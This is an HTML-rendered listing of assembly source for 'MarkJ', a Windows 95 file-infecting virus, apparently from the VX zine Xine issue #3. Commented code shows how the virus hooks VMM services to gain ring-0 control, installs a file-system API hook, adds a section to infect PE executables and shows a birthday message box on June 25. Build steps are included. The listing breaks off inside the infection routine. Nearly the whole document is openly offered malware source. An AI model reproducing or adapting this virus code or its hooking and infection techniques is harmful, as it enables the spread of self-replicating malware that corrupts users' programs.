<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>markj.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 200 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            MarkJ, by Murkry/IkX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Well this idea was very klunky (;) hi dv8) until I received and</span><span class="sc0">
</span><span class="sc1">; dissassembled the F---- harry 3 virus.  There I found that you could hook</span><span class="sc0">
</span><span class="sc1">; VxD functions (yay) using the QG manuver.  Well this made this virus easier,</span><span class="sc0">
</span><span class="sc1">; the main difference between QG's are this is larger and requires a section</span><span class="sc0">
</span><span class="sc1">; to be added the host; this is due to the method in how it gets tsr space its</span><span class="sc0">
</span><span class="sc1">; section header is set to Virtual address c0000000 - 400000 (bfc00000)</span><span class="sc0">
</span><span class="sc1">; which makes this section loaded at C0000000 an "unused" area  in sharedVxD</span><span class="sc0">
</span><span class="sc1">; memory this method will also work with the shared memory at 70000000 this</span><span class="sc0">
</span><span class="sc1">; method will leave that 1000h area in memory even after the orginal program</span><span class="sc0">
</span><span class="sc1">; is ended ;))</span><span class="sc0">
</span><span class="sc1">; (*added now b0z0 has already used this in one of his new viruses I am glad</span><span class="sc0">
</span><span class="sc1">; to see*)</span><span class="sc0">
</span><span class="sc1">;   As for the QG manuever well see his source code for more info but basically</span><span class="sc0">
</span><span class="sc1">; he uses a fixed location to find the vmm Device Descriptor Block in memory,</span><span class="sc0">
</span><span class="sc1">; then finds the schedule Global event entry point well you save this address</span><span class="sc0">
</span><span class="sc1">; and replace it with a pointer to your code which will then be at the ring0</span><span class="sc0">
</span><span class="sc1">; VxD land now you can call the ifsmger calls to do similiar to the mrKlunky</span><span class="sc0">
</span><span class="sc1">; and then repair the Global Event call and your set.  Yeah i know thats</span><span class="sc0">
</span><span class="sc1">; confusing read the code and figure it out you will learn more and feel better</span><span class="sc0">
</span><span class="sc1">; about yourself :)</span><span class="sc0">
</span><span class="sc1">;   Problems to overcome:</span><span class="sc0">
</span><span class="sc1">; well VxDcalls are coded in this fashion</span><span class="sc0">
</span><span class="sc1">;       int 20h</span><span class="sc0">
</span><span class="sc1">;       dd  00400032 ;    vxd vxdfunction</span><span class="sc0">
</span><span class="sc1">; which is replaced with</span><span class="sc0">
</span><span class="sc1">;       call [vxdfunction address]</span><span class="sc0">
</span><span class="sc1">; after the first time it is executed so the code can no longer be simply</span><span class="sc0">
</span><span class="sc1">; added to the host, QG fixed this by "patching" all these Dynalinks back to</span><span class="sc0">
</span><span class="sc1">; the int 20....  in Fharry, but he leaves the last one that is called at the</span><span class="sc0">
</span><span class="sc1">; final write to file which is converted to the call[...] b4 the write to file</span><span class="sc0">
</span><span class="sc1">; so this leaves one entry that is not patched Well this is sorta easy to fix</span><span class="sc0">
</span><span class="sc1">; in a number of methods I am choosing the easiest way which is to copy the</span><span class="sc0">
</span><span class="sc1">; code b4 the dynalink occur to an another location and when I write that copy</span><span class="sc0">
</span><span class="sc1">; of the code to the new host, another method would be to create the int 20's</span><span class="sc0">
</span><span class="sc1">; in a dynamic manner the first time this method might be nice for a mutating</span><span class="sc0">
</span><span class="sc1">; form of this type of virus as you can see VX technology is unlimited in what</span><span class="sc0">
</span><span class="sc1">; there is to explore in the Win95 enviroment.</span><span class="sc0">
</span><span class="sc1">;   hmm oh yeah the virus has a small payload on the 25th of june it will</span><span class="sc0">
</span><span class="sc1">; display a VWin32_SysErrorBox wishing Mark j a happy bday :)</span><span class="sc0">
</span><span class="sc1">;   For those who wonder MarkJ is my friend's son, who is the one who show me</span><span class="sc0">
</span><span class="sc1">; the wonderful world of Virii; JHB yea he is around!</span><span class="sc0">
</span><span class="sc1">; I know that since I show this to b0z0 he has taken this idea cleaned it up</span><span class="sc0">
</span><span class="sc1">; added new ideas so for some code that is more robust check out his article's</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Murkry</span><span class="sc0">


</span><span class="sc9">.Radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">     

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc1">;some restrictions</span><span class="sc0">
</span><span class="sc1">;I do not alter the Virtual address of the new section so the</span><span class="sc0">
</span><span class="sc1">; host host must load at a base address of a 400000h if this is not true do</span><span class="sc0">
</span><span class="sc1">; not infect</span><span class="sc0">
</span><span class="sc1">;to try to stay as a Win95 I check for file alignment as a 200h if not again</span><span class="sc0">
</span><span class="sc1">;do not infect</span><span class="sc0">
 
</span><span class="sc1">;  the "new" vxd area I create wants dd 0c0000040h</span><span class="sc0">
</span><span class="sc1">;for its characerstics or it fails out strange</span><span class="sc0">
</span><span class="sc1">; now this infects pe files that are name as .com files but get this</span><span class="sc0">
</span><span class="sc1">; the infect com will not run it hangs the system???? well this is just</span><span class="sc0">
</span><span class="sc1">;for demo purposes, rename the infected file to *.exe and it will work :)</span><span class="sc0">
</span><span class="sc1">;and lastly I did not add some check to insure that section directory has</span><span class="sc0">
</span><span class="sc1">;enough room in it ;) I leave these problems for the student to fix</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; unlike most vxd's virii this requires Tasm and a debug script that sets the</span><span class="sc0">
</span><span class="sc1">; characterisics of the .DATA to 0c0000040h all set ;)</span><span class="sc0">
</span><span class="sc1">;but does not need special .lib's or the infamous ddk ;)</span><span class="sc0">
</span><span class="sc1">;while i have access to it I prefer to make my files without such  things</span><span class="sc0">
</span><span class="sc1">;that way I can use Tasm and not Masm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Well  Virii eXplorers I hope this is an acceptable offering ;)</span><span class="sc0">
</span><span class="sc1">;thanks to QuantumG, DV8 for source and EXE's that help complete this</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Murkry 8/21/97</span><span class="sc0">

</span><span class="sc1">; Compiling:</span><span class="sc0">
</span><span class="sc1">;   tasm32 /ml /m3 markj,,;</span><span class="sc0">
</span><span class="sc1">;   tlink32 /Tpe /aa /c  /v markj,markj,, import32.lib,</span><span class="sc0">
</span><span class="sc1">; And then just make the DATA area to be loaded at BFC00000h with a hex editor</span><span class="sc0">

</span><span class="sc5">LoadAt</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
</span><span class="sc5">PeHeader</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
 
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">AddAtomA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0"> 
</span><span class="sc1">;this is just the data area that I am using to build the code that will</span><span class="sc0">
</span><span class="sc1">;go in the 0c0000000h area the start of the host will be in the .code</span><span class="sc0">
</span><span class="sc1">; and in a real infection it will execute from the section dir..</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">markj</span><span class="sc4">:</span><span class="sc0">
        
</span><span class="sc1">;first thing find the VMM uses a fixed location here</span><span class="sc0">
</span><span class="sc1">;yea this is just a modfied form of fuck harry by QG but</span><span class="sc0">
</span><span class="sc1">;why not</span><span class="sc0">
</span><span class="sc1">;maybe its possible to just scan for 'VMM '</span><span class="sc0">
</span><span class="sc1">;From 0C0010000 ?</span><span class="sc0">

</span><span class="sc5">StartOfVirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;ok first thing copy the virus to the end of our work and data error</span><span class="sc0">
        </span><span class="sc1">;this way we have an ucorrupted version</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DummyCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">Ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C000157Fh</span><span class="sc0">           </span><span class="sc1">;pointer to one location???</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;of the VMM dbb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0C</span><span class="sc4">],</span><span class="sc2">0204D4D56h</span><span class="sc0">  </span><span class="sc1">;'VMM '</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">ErrorExit</span><span class="sc0">                </span><span class="sc1">;if not here get out</span><span class="sc0">
  
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">      
        </span><span class="sc1">;find the Service table for th vmm</span><span class="sc0">
        </span><span class="sc1">;now load the call_global_event address (I think)</span><span class="sc0">
        </span><span class="sc1">;I have read the source to Fharry and I was right :)</span><span class="sc0">
        </span><span class="sc1">;Sorta hook this Services</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">      

        </span><span class="sc1">;Store this value to restore it later</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OrgIfsEntry</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                                </span><span class="sc1">; 0c000e384h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDOff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                                </span><span class="sc1">; 402066</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewHandler</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                                      </span><span class="sc1">;hook the code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;New Location of our Handler</span><span class="sc0">
                  
</span><span class="sc1">;Ok we should be set to return to the host</span><span class="sc0">

</span><span class="sc5">ErrorExit</span><span class="sc4">:</span><span class="sc0">  
         
</span><span class="sc5">RetToHost</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CheckTsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;In Dos we would now be in the int Handler</span><span class="sc0">
</span><span class="sc1">; Here we are now in Ring 0 and are part of the VxD land ;)</span><span class="sc0">
</span><span class="sc1">; this is where we finish the QG manuever by hooking HookFSD </span><span class="sc0">

</span><span class="sc5">NewHandler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">          
                                   

 </span><span class="sc1">;restore the global event hook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">VxDOff</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;mov    [00000000],eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0A3h</span><span class="sc0">
</span><span class="sc5">OrgIfsEntry</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDSeg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CallIFSHook</span><span class="sc0">       

        </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;        jmp    0028:00000000     </span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">VxDOff</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0401000h</span><span class="sc0">   
</span><span class="sc5">VxDSeg</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0137h</span><span class="sc0">       
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">VVxdCall1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CallIFSHook</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewFShook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;this is sorta like hooking every int21 that handle file access in DOS</span><span class="sc0">
</span><span class="sc1">;This will add a FS hook now whenever a FSD is Called  this will be called</span><span class="sc0">
</span><span class="sc1">;first</span><span class="sc0">
</span><span class="sc1">;Call</span><span class="sc0">
</span><span class="sc1">;Tos = New Fsd Address to Install</span><span class="sc0">
</span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc1">;EAX = Last FShook</span><span class="sc0">
</span><span class="sc5">ApiHook</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;4020dd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">V1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">APIHOOKVXD</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400067h</span><span class="sc0">
        </span><span class="sc1">;  IFSMgr_Device_ID    0x00040 /* Installable File System Manager */</span><span class="sc0">
        </span><span class="sc1">;  IFSMgr_Service  IFSMgr_InstallFileSystemApiHook         67</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000004</span><span class="sc0">       </span><span class="sc1">;like a pop changes no regs but esp </span><span class="sc0">
                                  </span><span class="sc1">;some VxD's routines</span><span class="sc0">
                                  </span><span class="sc1">;do not clean up after themselves</span><span class="sc0">
                                  </span><span class="sc1">;Sometimes check docs for specs :))</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; restore Edx</span><span class="sc0">
  </span><span class="sc1">;Save the old FSHook so we can chain to it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldFSD</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;A little payload here if its the 6/25 then display the B-day mess</span><span class="sc0">
</span><span class="sc1">;just using the VMM Exec_VxD_Int to get the System date</span><span class="sc0">
</span><span class="sc1">;To be honest I could not find an easier way to do this!!!</span><span class="sc0">
</span><span class="sc1">;there are some VxD that give time and date but the date is how many</span><span class="sc0">
</span><span class="sc1">; seconds(I think) from some date in the 1980's this is easier and</span><span class="sc0">
</span><span class="sc1">; shows that accessing int 21 is still possible infact if QG is hooking the</span><span class="sc0">
</span><span class="sc1">; the GlobalEvent from the VMM it should be possible to hook the int21</span><span class="sc0">
</span><span class="sc1">; hanlder in a similiar fashion then some creative coding could make the</span><span class="sc0">
</span><span class="sc1">; Dos tsr and the VxD code very similiar....</span><span class="sc0">
</span><span class="sc1">; check for 6/25 if its the date show the message and set the flag</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00002A00h</span><span class="sc0">   </span><span class="sc1">;get system date</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">V2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0001008fh</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0619</span><span class="sc0">
                </span><span class="sc1">;6/25 in hex for those decimal heads ;)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ForGetIt</span><span class="sc0">
         
         
 </span><span class="sc1">;this shows how one might use the VWin32_SysErrorBox</span><span class="sc0">
</span><span class="sc1">;To display a little message justing saying Hi to JHB's son who is the</span><span class="sc0">
</span><span class="sc1">; happy (?) reason jhb is not coding as much any more  I should add he</span><span class="sc0">
</span><span class="sc1">;did help with alot of this code </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EBox</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">V3</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">002a001ah</span><span class="sc0">


</span><span class="sc5">ForGetIt</span><span class="sc4">:</span><span class="sc0">
 
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;all right we have "legal" hook into a FSD and the rest is the</span><span class="sc0">
</span><span class="sc1">;just the infection routine</span><span class="sc0">
</span><span class="sc5">NewFShook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000020</span><span class="sc0">       

</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Relative EBP this is what was passed I hope DV8 does not mind me</span><span class="sc0">
</span><span class="sc1">; using his docs to define this stuff</span><span class="sc0">
</span><span class="sc1">;00  - ebp</span><span class="sc0">
</span><span class="sc1">;04  - address of caller</span><span class="sc0">
</span><span class="sc1">;08  - adress of FSD Function</span><span class="sc0">
</span><span class="sc1">;0c  - Function ID</span><span class="sc0">
</span><span class="sc1">;10  - drive</span><span class="sc0">
</span><span class="sc1">;14  - Type of Resource</span><span class="sc0">
</span><span class="sc1">;18  - Code Page</span><span class="sc0">
</span><span class="sc1">;1C  - Pointer to IOREQ record</span><span class="sc0">
</span><span class="sc1">;        00 dw Lenght if user Buffer</span><span class="sc0">
</span><span class="sc1">;        02 db status Flag</span><span class="sc0">
</span><span class="sc1">;        03 db requests' user Id</span><span class="sc0">
</span><span class="sc1">;        04 dw file handle's System File number</span><span class="sc0">
</span><span class="sc1">;        06 dw Process ID</span><span class="sc0">
</span><span class="sc1">;   there is more I will copy or add as needed</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

       </span><span class="sc1">; mov    edi,00000000</span><span class="sc0">
</span><span class="sc1">;                db      0bfh           ;this gets us so edi points to our</span><span class="sc0">
</span><span class="sc1">;VirriOffVxD     dd      LoadAt         ;loc in memory</span><span class="sc0">

</span><span class="sc1">; Use this flag so we are not reentrant</span><span class="sc0">
 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Flag1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">letOrginal</span><span class="sc0">
</span><span class="sc1">;Win95 always opens the file b4 running it so this checks and lets us </span><span class="sc0">
</span><span class="sc1">;check if it  is opened</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">00000024h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">letOrginal</span><span class="sc0">

</span><span class="sc1">;ok set our flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Flag1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Primary Data buffer of the IOREQ</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">NoNeedDriveLetter</span><span class="sc0">         
 

